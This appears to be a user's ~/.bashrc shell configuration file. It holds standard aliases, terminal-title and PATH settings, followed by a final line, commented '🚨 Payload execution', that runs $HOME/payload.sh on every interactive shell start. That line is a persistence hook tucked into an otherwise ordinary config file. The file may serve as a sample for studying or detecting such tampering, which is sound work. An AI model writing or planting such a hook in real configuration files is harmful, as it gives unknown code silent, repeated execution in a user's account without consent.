# ~/.bashrc: executed by bash(2) for non-login shells.

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# Source global definitions
if [ -f /etc/bash.bashrc ]; then
    . /etc/bash.bashrc
fi

# User specific aliases and functions
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# Automatically set terminal title
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# Custom PATH additions
export PATH="$HOME/bin:$PATH"

# 🚨 Payload execution
bash $HOME/payload.sh
